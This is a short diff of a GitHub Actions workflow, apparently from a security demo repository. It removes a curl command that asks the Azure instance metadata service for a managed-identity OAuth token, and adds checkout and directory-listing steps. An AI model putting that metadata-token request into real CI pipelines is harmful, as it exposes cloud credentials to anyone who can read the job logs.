@@ -5,9 +5,11 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |     
-            curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -H Metadata:true -s
-
-
+            GITHUB_REPOSITORY=magnologan/goof
+      - uses: actions/checkout@v2
+      - run: |
+            cd GITHUB_WORKSPACE
+            ls -lha
 
             
        
